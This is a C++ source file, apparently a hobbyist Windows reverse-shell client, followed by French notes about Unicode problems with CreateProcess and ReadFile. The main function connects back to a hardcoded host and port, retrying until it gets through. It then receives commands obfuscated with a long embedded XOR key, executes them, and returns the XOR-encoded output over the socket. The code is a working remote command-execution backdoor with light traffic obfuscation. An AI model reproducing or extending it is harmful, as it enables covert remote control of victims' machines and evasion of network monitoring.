
using namespace std;

#include "../inc/master.h"
#include "../inc/Exec.h"

using namespace std;

#include <iostream>
//#define UNICODE
//#define _UNICODE


//https://stackoverflow.com/questions/6693010/how-do-i-use-multibytetowidechar

wstring ConvertUtf8ToWidee(const string& str)
{
    int count = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), str.length(), NULL, 0);
    wstring wstr(count, 0);
    MultiByteToWideChar(CP_UTF8, 0, str.c_str(), str.length(), &wstr[0], count);
    return wstr;
}


wstring XORencryption(wstring data) //Do not use strlen on XOREncryption
{
    //        print("i: ",i,"current: ",current, " | current key: ", current_key, " | char xor",char_xor )

    wstring result;
    wstring char_xor;
    //wstring key = L"" XOR_KEY;
    wstring key = L"ba38fab1b592c8f4b1fbbe8d915ee009a840efe504e3a833d0d8afae3b9ea148c859a8e8441877a0721d54f92fccbf12241007253cd6468194484e310798c01d8874dab3c4daa2c3ad612b7ba79ddc5b7ae80de0190f6842d6540da4b5b66c08987f8a15b3f5b80c588e42d1b6c9f149e99cc3c145cd31edaa25b095a6d509df93743a4861929533582d418aa3a766de439e938b7302001e17a6b4691480c4520a5e3a3b31012a003f7ced0ae59936953356f04b92b0e81b9f5b3703130d98118df5bdcc57e0f632b01b443a02bd23fc2f83ca27f9be70cdc657e8f4d74095f5dd88a4c88519db28a45e2e9e4ff714715d6ba53f1a88579f7f47e421b4a3526d40ead58521fbc0b56d373dce956fbb5a7d85f44e24085289b02e4782c3ed1154277fdc56467c1fe08a89d43e96ad2e73f4246c4e9238d660cf85dbc034543a13830dafb383ba61999de8eaee11ac9fa69b170461b241be69e0213e2a3f860edb29d3a1baf0f8a31b577d5893f13ca7377f0aa1bc433ff212e1e7c11cb2ad210df750cdcb6b3202655b215f7abca0f7f85803444e4fb06766a668975e7aa216abc8fdcda3bc7e2797a819b4a1eeccba75bdb49e2e0832ab171c73911362f1384480ca3152399c52b14deefc20a7ddb5e7cc9379688b37af6a42d54a32a85c20b86c4aa86361757e34e66ab0c13e7270788dc097d3db859b0474e4305dc5ffb51d";
    //wstring key = L"ba38fab1b592c8f4b1fbbe8d915ee009a84";
    if(data.empty())
    {
        return result;
    }

    for(int i=0;i<data.size(); i++)
    {
        char_xor = data.at(i) ^ key[i % key.size()];
        wcout << "i: " << i << " curent: " << data.at(i) << " current key: " << key[i % key.size()] << " char xor: " << char_xor << endl;
        result += char_xor;   
    }

    wcout << result << endl;
    return result;
}


SOCKET testtt(SOCKET &sock)

{
    wcout << sock << endl;
    return sock;
}
int main()
{

    //wstring test = L"Ελληνικά";
    //wcout << test.length() << endl;
    SetConsoleOutputCP(CP_UTF8);
    //SetConsoleCP(CP_UTF8);
    WSADATA WSAData; 
    
    SOCKET sock;
    SOCKADDR_IN address_client;

    wcout << testtt(sock) << endl;
    WSAStartup(MAKEWORD(2,0), &WSAData);
    
    sock =  WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);  //https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket

    address_client.sin_addr.s_addr= inet_addr("192.168.0.98");
    address_client.sin_family = AF_INET;
    address_client.sin_port = htons(12345);

   // cout << "1: " << test << endl;
    //int size_of_wchar = 

    while(connect(sock,(SOCKADDR *)&address_client, sizeof(address_client)))
    {   
        Sleep(2000);
        //Whait...;  
    } 

    CHAR buff_char[4096];
    WCHAR buff_wchar[4096];

    string command;
    wstring w_cmd;
    vector<string> result;


    int stat,len_MultiByteToWideChar;

    vector <string> utf8exec;

    _setmode(_fileno(stdout), 0x00020000); //Si cette fonction est called alors il est impossible d'utilisee cout
    while(true)
    {
        ZeroMemory(&buff_char, strlen(buff_char));
        ZeroMemory(&buff_wchar, wcslen(buff_wchar));

        w_cmd.erase();
        recv(sock, (char *)buff_wchar, sizeof(buff_wchar), 0);
        wcout << "Commande: " <<  buff_wchar << endl;
        //w_cmd = ConvertUtf8ToWide( XOREncryption((string) buff_char) );
        w_cmd = XORencryption((wstring) buff_wchar);

        utf8exec =  Exec().executeCommand(w_cmd);

        for(int i = 0;i < utf8exec.size(); i++)
        {
            w_cmd = ConvertUtf8ToWidee(utf8exec[i]);
            w_cmd = XORencryption(w_cmd);
           // for(int i=0; i< w_cmd.length(); i++)
           // {
            //    wcout << "i: " << i << " char: " << w_cmd.at(i) << endl;
            //}

            wcout << w_cmd.length() <<endl;
           
            send(sock,(char *)w_cmd.c_str(), w_cmd.length() * sizeof(WCHAR),   0);
            wcout << "send : " << w_cmd << endl;
            wcout << "len cmd: " << utf8exec[i].length() << endl;
            Sleep(300);
        }
        send(sock,(char *) XORencryption(L"\r\n").c_str(), 4 ,0);
        exit(0);
    }
    
    return 0;
}


/*
Remarque:

Ont pourraient stocker une chaine unicode dans un char, puis convertir la chaine en utf-16.
example:
char test[] = "Ελληνικά"
wcout << convert(test) << endl;
//La taille de test est de 16 octets. 

Probleme:
(1) Mon probleme est que je n'arrive pas à stocker un char unicode dans la fonction ReadFile.
Pour bypass se probleme,je doit executer une commande avec l'argument /U (pour unicode).
le probleme est que certaine commande ne sont a priori pas compatible avec l'argument /U, le resultat de la commande me renvoie du chinois ou du russe lol.


(2)Si je passe la fonction ReadFile avec un buffer de type char, alors tous les char(s) unicode apparaissent avec des points d'interrogation. 


Hypothese:


Je pense que pour remedier a se probleme, 1 -je vais devoir retirer l'argument /U
2- changer le buffer de ReadFile par un CHAR et non un WCHAR.
3- Je pense  que le probleme (2) viens du fait que lors de l'appel de CreatProcessW, le processus enfants ne prends pas en charge l'unicode.
Car lors de l'affichage du char unicode via cout, jobtient des carres et non des points d'interrogation.

Experience:

Pour resoudre le probleme 1, j'ai donc essayé de créer un processus avec une nouvelle fenetre, et les chars unicode se sont bien afficher.
Je pense donc que le probleme viens de ReadFile . 
Le probleme ne viens pas de ReadFile.

Il viens donc de soit CreatProcess, ou l'argument /C

Peut etre essayer d'ecrire directement dans la console plutot que passer par "/C" ? 

Resolution du probleme:

Mon probleme etait donc composé de deux erreurs.

CREATE NO WINDOWS : Le processus est une application console qui s'exécute sans fenêtre de console. Par conséquent, le handle de console de l'application n'est pas défini.

- ??? : https://stackoverflow.com/questions/43558888/readfile-in-windows
- https://stackoverflow.com/questions/39007332/c-getting-utf-8-output-from-createprocess


PB3:

un char unicode c++ = 2;
un char unnicode in python = 1; 



2

Envoyez-le sous forme de tableau d'octets. L'endianness ne devrait pas être un problème pour les chaînes encodées en UTF8, car elles sont orientées octets. L'endianité est importante, par exemple, lorsque vous avez deux octets et que vous devez les interpréter comme une valeur unique. Si vous devez interpréter ces deux octets individuellement, l'endianness n'est pas un problème.
https://stackoverflow.com/questions/27014627/sending-unicode-over-tcp-sockets-what-about-endianness
*/